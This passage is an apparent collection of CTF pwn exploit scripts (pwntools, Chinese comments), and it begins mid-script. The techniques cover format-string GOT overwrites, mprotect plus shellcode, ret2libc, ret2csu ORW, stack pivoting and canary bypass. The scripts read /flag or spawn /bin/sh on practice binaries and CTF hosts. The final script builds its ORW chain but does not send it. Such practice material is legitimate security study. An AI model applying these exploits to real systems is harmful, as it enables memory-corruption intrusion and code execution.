what_addr = proc_base + elf.symbols['what'] # what()函数调用mprotect((void *)0x114514000LL, 0x1000uLL, 7);,让shellcode地址变为可执行
puts_got = proc_base + elf.got['puts']

payload2 = b"%6$p\x00"
io.sendafter(delim, payload2)
io.recvuntil(b'0x')
rbp_main = int(io.recvline()[:12], 16)
rbp = rbp_main - 0x10

addr1 = rbp + 0x08 # 7$
addr2 = rbp + 0x38 # 13$
addr3 = rbp + 0x50 # 16$

addrs = [addr1, addr2, addr3]

# 有4(或者3)个指针指向puts@got,这样就能通过这4(或者3)个$修改puts@got表项为我们想要执行的函数
# 这样每次在调用puts函数时就会执行我们想要的函数,或者自己写的指令
for i in range(3):
    payload3 = b"%" + str(addrs[i] & 0xffff).encode() + b"c%11$hn\x00"
    io.sendafter(delim, payload3)
    payload4 = b"%" + str((puts_got + 2 * i) & 0xffff).encode() + b"c%39$hn\x00"
    io.sendafter(delim, payload4)

#----------------------------------------------------------------------------------------------------------------#
#-----------------------------------------修改puts@got为(&what)------------------------------------------------#
what_addr_1 = what_addr & 0xffff
what_addr_2 = (what_addr >> 16) & 0xffff
what_addr_3 = (what_addr >> 32) & 0xffff

payload5 = b"%" + str(what_addr_1).encode() + b"c" + b"%7$hn"
payload5 += b"%" + str(0x10000 - what_addr_1 + what_addr_2).encode() + b"c" + b"%13$hn"
payload5 += b"%" + str(0x10000 - what_addr_2 + what_addr_3).encode() + b"c" + b"%16$hn\x00"
io.sendafter(delim,  payload5)

#--------------------------------------------------------------------------------------------------------------#
#----------------------------------修改puts@got为(&shellcode)--------------------------------------------------#
shellcode_addr = 0x114514000 + 0x27 # len(payload6) = 0x27

shellcode_addr_1 = shellcode_addr & 0xffff
shellcode_addr_2 = (shellcode_addr >> 16) & 0xffff
shellcode_addr_3 = (shellcode_addr >> 32) & 0xffff
payload6 = b"%" + str(shellcode_addr_1).encode() + b"c" + b"%7$hn"
payload6 += b"%" + str(0x10000 - shellcode_addr_1 + shellcode_addr_2).encode() + b"c" + b"%13$hn"
payload6 += b"%" + str(0x10000 - shellcode_addr_2 + shellcode_addr_3).encode() + b"c" + b"%16$hn\x00"

shellcode = shellcraft.open("/flag", 0) + shellcraft.read(3, "rsp", 0x100) + shellcraft.write(1, "rsp", 0x100)
payload = payload6 + asm(shellcode)
io.sendafter(delim, payload)

#---------------------------------------------------------------------------------------------------------------#

print("<main+80>:", hex(main_80))
print("<proc_base>:", hex(proc_base))
print("<what>: ", hex(what_addr))
print("$rbp =", hex(rbp))

io.interactive()
~~~

~~~python
# ⼤致流程就是fmt改返回地址改到mprotect，然后再修改mprotect的返回地址改到shellcode
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)
libc = elf.libc
io = process(pwnfile)
# io = remote("47.97.58.52", 43001)

script = """set context-output /dev/pts/5"""
# gdb.attach(io, script)
# pause()

what_addr = elf.symbols['what']

delim = b"Say something:"

payload1 = b"deadbeef%6$p\x00"
io.sendafter(delim, payload1)
io.recvuntil(b"deadbeef")
rbp_main = int(io.recv(14), 16)
rbp = rbp_main - 0x10
ret1 = rbp + 8
ret2 = rbp + 0x10

payload2 = b"deadbeef%13$p\x00"
io.sendafter(delim, payload2)
io.recvuntil(b"deadbeef")
main_addr = int(io.recv(14), 16)
proc_base = main_addr - elf.symbols['main']
what_addr = proc_base + elf.symbols['what']

payload3 = "%{}c%11$hn\x00".format(ret1 & 0xffff)
io.sendafter(delim, payload3)
payload4 = "%{}c%39$hn\x00".format(what_addr & 0xffff)
io.sendafter(delim, payload4)

shellcode_addr = 0x114514030
for i in range(3):
    payload3 = "%{}c%11$hn\x00".format((ret2 + i * 2) & 0xffff)
    io.sendafter(delim, payload3)
    payload4 = "%{}c%39$hn\x00".format((shellcode_addr >> (i * 16)) & 0xffff)
    io.sendafter(delim, payload4)

shellcode = shellcraft.open("/flag", 0) + shellcraft.read(3, "rsp", 0x100) + shellcraft.write(1, "rsp", 0x100)
payload5 = b'stop\x00'.ljust(0x30,b'\x00') + asm(shellcode)
io.sendafter(delim, payload5)

io.interactive()
~~~



**ORW + ret2libc + ret2csu**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./ret2libc_orw_x64"
elf = ELF(pwnfile)
libc = elf.libc
io = process(pwnfile)

gdb.attach(io, "set context-output /dev/pts/5")
pause()

write_got = elf.got['write']
read_got = elf.got['read']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
dofunc_addr = elf.symbols['dofunc']
delim = b"input name:"
#------------------------------------------------------------------------------#
#------------------------------泄露libc地址-------------------------------------#
pop_rdi_ret = 0x4013e3
padding = cyclic(16)
rdi = read_got
ret = printf_plt
payload = flat([padding, pop_rdi_ret, rdi, printf_plt, dofunc_addr]) # 结尾放dofunc_addr做printf的ret来续命
io.sendafter(delim, payload)
io.recvline()
read_libc = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = read_libc - libc.symbols['read']
open_libc = libc_base + libc.symbols['open']
write_libc = libc_base + libc.symbols['write']
syscall_libc = libc_base + libc.symbols['syscall']
print("<read@libc>:", hex(read_libc))
print("<libc_base>:", hex(libc_base))
#-----------------------------------------------------------------------------#
#--------------------------------输入"/flag"到.bss----------------------------#
# elf.bss() + 0x100 —▸ "/flag"
# elf.bss() + 0x100 + 0x10 —▸ syscall@libc 相当于是syscall的got
STDIN = 0
csu1 = 0x4013C0
csu2 = 0x4013DA
rbx = 0
rbp = 1                  # rbp = rbx + 1 not jump
r12 = STDIN              # —▸ rdi
r13 = elf.bss() + 0x100  # —▸ rsi
r14 = 0x100              # —▸ rdx
r15 = read_got           # call [r15]
padding2 = p64(0xdeadbeef) * 7 # (add rsp, 8) + (pop * 6)
payload = flat([padding, csu2, rbx, rbp, r12, r13, r14, r15, csu1, padding2, dofunc_addr]) # 垫padding2和dofunc_addr继续续命
io.sendafter(delim, payload)
io.recvline()
io.send(b"./flag\x00".ljust(0x10, b'\x00') + p64(syscall_libc)) # 将字符串放到指定位置，将syscall的地址放到自制的got中
#-----------------------------------------------------------------------------#
#--------------------------------ORW---------------------------------#
O_RDWR = 2
# pop_rdi_ret = 0x4013e3
# pop_rsi_r15_ret = 0x4013e1
# rdi = elf.bss()+0x100
# rsi = O_RDWR
# r15 = 0xdeadbeef
# open()函数用的是openat系统调用，这个不是open系统调用所以被禁掉了
# 用libc的syscall()函数来做open的系统调用
# 然后正常用csu调用read()和write()就行
syscall_got = elf.bss() + 0x100 + 0x10
csu1 = 0x4013C0
csu2 = 0x4013DA
rbx = 0
rbp = 1                  # rbp = rbx + 1 not jump
r12 = constants.SYS_open # —▸ rdi
r13 = elf.bss() + 0x100  # —▸ rsi
r14 = O_RDWR             # —▸ rdx
r15 = syscall_got        # call [r15]
payload1 = flat([padding, csu2, rbx, rbp, r12, r13, r14, r15, csu1, padding2, csu2])

flag_addr = elf.bss() + 0x100 + 0x50
fd = 3
csu1 = 0x4013C0
csu2 = 0x4013DA
rbx = 0
rbp = 1                 # rbp = rbx + 1 not jump
r12 = fd                # —▸ rdi
r13 = flag_addr         # —▸ rsi
r14 = 0x100             # —▸ rdx
r15 = read_got          # call [r15]
payload2 = flat([rbx, rbp, r12, r13, r14, r15, csu1, padding2, csu2])

STDOUT = 1
csu1 = 0x4013C0
csu2 = 0x4013DA
rbx = 0
rbp = 1                 # rbp = rbx + 1 not jump
r12 = STDOUT            # —▸ rdi
r13 = flag_addr         # —▸ rsi
r14 = 0x100             # —▸ rdx
r15 = write_got         # call [r15]
payload3 = flat([rbx, rbp, r12, r13, r14, r15, csu1, padding2, dofunc_addr])
payload = payload1 + payload2 + payload3
io.sendafter(delim, payload)

io.interactive()
~~~

**ret2shellcode + ORW**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)
# libc = elf.libc
# io = process(pwnfile)
io = remote("47.97.58.52", 43010)

script = """set context-output /dev/pts/6
b *(&main+298)
"""
# gdb.attach(io, script)
# pause()

delim = b"Show me what you want to run: "

print(elf.got['read'] - (elf.symbols['main'] + 300)) # 10733
sh = """xor edi, edi ; edi = STDIN
mov esi, edx         ; edx = 0x20240000
mov rax, [rsp]       ; [rsp] = &main + 300
add rax, 10733       ; rax = &read@got
call [rax]           ; call [read@got] """
io.sendafter(delim, asm(sh))

sh1 = shellcraft.open("/flag", 0) + shellcraft.read(3, "rsp", 0x100) + shellcraft.write(1, "rsp", 0x100) # 注意一下open的权限
payload = b'\x90' * 0x10 + asm(sh1)
pause()
io.send(payload)

io.interactive()
~~~

** 

**泄露 + 栈迁移**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)
libc = elf.libc
io = process(pwnfile)
io = remote("47.97.58.52", 43001)

script = """set context-output /dev/pts/5"""
# gdb.attach(io, script)
# pause()

puts_plt = elf.plt["puts"]
puts_got = elf.got['puts']
read_plt = elf.plt["read"]
read_got = elf.got['read']
vuln_addr = elf.symbols['vuln'] # 0x401205
call_read_vuln = 0x401211
call_puts_vuln = 0x401218
buf_len = 0x20
leave_ret = 0x401234
pop_rdi_ret = 0x4012c3

delim = b"Every doll has her fixed place,but not stack ~\n"

padding = cyclic(buf_len)
rbp1 = elf.bss() + 0x100
rbp2 = 0x404c00 + 0x8 # 一个空间很大不会影响其它地址的可写地址,而且还加了8绕过 movaps xmmword ptr [rsp + 0x50], xmm0 对齐检验

payload1 = flat([padding, rbp1, call_read_vuln]) # 重新回去布置rbp1的栈帧
io.sendafter(delim, payload1)

# rbp1栈帧
payload2 = flat([rbp2, pop_rdi_ret, puts_got, call_puts_vuln, rbp1 - 0x20, leave_ret]) # 在vuln中泄露got,这样既能puts又能再read一遍,布置rbp2的栈帧
io.sendafter(delim, payload2)

puts_libc = u64(io.recvuntil(b"\n", True).ljust(8, b'\x00'))
libc_base = puts_libc - libc.symbols['puts']
system_libc = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

print("<puts@libc>:", hex(puts_libc))
print("<system@libc>:", hex(system_libc))
print("rbp1 =", hex(rbp1))
print("rbp2 =", hex(rbp2))
pause()

# rbp2栈帧
payload3 = flat([0xdeadbeef , pop_rdi_ret, bin_sh_addr, system_libc, rbp2 - 0x20, leave_ret])
io.send(payload3)

io.interactive()
~~~

**canary 绕过**

~~~python
# Canary 读取二次绕过
from pwn import *

context(log_level="debug", arch="i386", os="linux")

pwnfile = "./pwnfile"
elf = ELF(pwnfile)
# libc = elf.libc
libc = ELF("./libc6-i386_2.35-0ubuntu3.8_amd64.so")

# io = process(pwnfile) 
io = remote("101.200.155.151", 12400)

# script = """set context-output /dev/pts/7"""
# gdb.attach(io,script)
# pause()

setbuf_got = elf.got['setbuf']
puts_got = elf.got['puts']
read_got = elf.got['read']
printf_got = elf.got['printf']
ret_addr = 0x080492C2
print("<read@got>:", hex(read_got))
print("<puts@got>:", hex(puts_got))

fmtstr1 = b"%9$s%1$p"
fmtstr1 = fmtstr1.ljust(((len(fmtstr1) - 1) // 4 + 1) * 4, b'\xaa')

padding = cyclic(0x40 - len(fmtstr1) - 4)

payload1 = flat(fmtstr1, read_got, padding, b"#") # 第一次读取canary,还没有触发栈溢出检查
print(payload1)

delim = b"\n\n"

io.sendafter(delim, payload1)

read_libc = u32(io.recv(4)) # %s 输出地址字节
io.recvuntil(b"0x")
buf_addr = int(io.recv(8), 16) # %p 输出地址字符串
print("<read@libc>:", hex(read_libc))
print("<buf@stack>:", hex(buf_addr))

io.recvuntil(b"#")
canary = u32(io.recv(3).rjust(4, b"\x00"))
print("[+]Canary:", hex(canary))

offset = libc.symbols['system'] - libc.symbols['read']
system_libc = read_libc + offset

bin_sh = b"/bin/sh\x00"
padding1 = cyclic(0x40 - len(bin_sh))
padding2 = cyclic(0xc)

bin_sh_offset = next(libc.search(b"/bin/sh")) - libc.symbols['read']
bin_sh_addr = read_libc + bin_sh_offset # 本来可以用read写在栈上的,但是在system执行的过程中被栈被覆盖了
# 所以换成libc中的/bin/sh了

payload2 = flat(bin_sh, padding1, canary, padding2, system_libc, 0xdeadbeef, bin_sh_addr)
# 第二次改eip的时候提前知道了canary的值,就能在不改变canary的情况下实现栈溢出
io.sendafter(delim, payload2)

io.interactive()
~~~

**fmtstr + orw**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

elf = ELF("./attachment-42")
libc = elf.libc
io = process("./attachment-42")
# io = remote("101.200.155.151", 12500)

# script = """set context-output /dev/pts/5"""
# gdb.attach(io,script)
# pause()

puts_got = elf.got['puts']
printf_got = elf.got['printf']
read_got = elf.got['read']
prctl_got = elf.got['prctl']

# <puts@libc>: 0x7f334c5ff5a0
# <read@libc>: 0x7f334c682e90

func1_addr = elf.symbols['func_1']
func2_addr = elf.symbols['func_0']

delim = b"where are you go?\n"
io.sendlineafter(delim, b'1')

fmtstr1 = b"%9$s%10$s%11$s%12$s"
fmtstr1 = b"%7$s%8$s"
fmtstr1= fmtstr1.ljust(((len(fmtstr1) - 1) // 8 + 1) * 8, b'#')
padding = cyclic(0x28 - len(fmtstr1) - 2 * 8)
payload1 = flat(fmtstr1, puts_got, read_got, padding, b'#')
padding = cyclic(0x28)
payload1 = flat(padding, b'#')
delim = b"Enter you password:\n"
io.sendafter(delim, payload1)
io.recvuntil(b'#')
canary = u64(io.recv(7).rjust(8, b'\x00'))
stack_addr = u64(io.recv(6).ljust(8, b'\x00'))
print("[*]Canary=", hex(canary))
print("<stack@addr>:", hex(stack_addr))

padding = cyclic(0x28)
payload2 = flat(padding, canary)
delim = b"I will check your password:\n"
io.sendafter(delim, payload2)

delim = b"where are you go?\n"
io.sendlineafter(delim, b'2')

ret1_addr = 0x4014F1
fmtstr1 = b"%7$s%8$s"
fmtstr1= fmtstr1.ljust(((len(fmtstr1) - 1) // 8 + 1) * 8, b'#')
padding = cyclic(0x28 - len(fmtstr1) - 2 * 8)
payload3 = flat(fmtstr1, puts_got, read_got, padding, canary, stack_addr, ret1_addr)
delim = b"We have a lot to talk about\n"
io.sendafter(delim, payload3)
io.recvuntil(b"\n")
puts_libc = u64(io.recv(6).ljust(8, b'\x00'))
print("<puts@libc>:", hex(puts_libc))
read_libc = u64(io.recv(6).ljust(8, b'\x00'))

libc_base = puts_libc - libc.symbols['puts']
open_libc = libc_base + libc.symbols['open']
write_libc = libc_base + libc.symbols['write']
print("<libc@base>:", hex(libc_base))
print("<open@libc>:", hex(open_libc))
print("<read@libc>:", hex(read_libc))
print("<write@libc>:", hex(write_libc))

O_RDONLY = 0
fd = 3
STDOUT = 1

pop_rdi_ret = 0x40119a
pop_rsi_r15_ret = 0x40119c
stack_addr -= 0x20
flag = "/flag\x00"
flag_addr = stack_addr + 18 * 8
print("<flag@addr>:", flag_addr)
rdi = O_RDONLY
padding = cyclic(0x28)
payload4 = flat(padding, canary, stack_addr, pop_rdi_ret, O_RDONLY, pop_rsi_r15_ret, flag_addr, 0xdeadbeef, open_libc, 
                pop_rdi_ret, fd, pop_rsi_r15_ret, flag_addr, 0xdeadbeef, read_libc,
                pop_rdi_ret, STDOUT, flag_addr, 0xdeadbeef, write_libc, 
                flag)
delim = b"We have a lot to talk about\n"

io.interactive()
~~~

